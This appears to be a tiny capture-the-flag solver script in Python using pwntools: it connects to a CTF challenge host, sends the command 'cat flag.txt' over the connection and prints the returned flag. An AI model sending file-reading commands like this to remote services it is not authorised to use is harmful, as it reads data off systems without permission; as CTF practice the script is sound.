#!/usr/bin/python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")

host = "host1.metaproblems.com"
port = 5501

r = remote(host, port)

r.sendline(b"cat flag.txt")

r.recvuntil(b'Here is your flag: ')
log.success(r.recvline())

r.close()

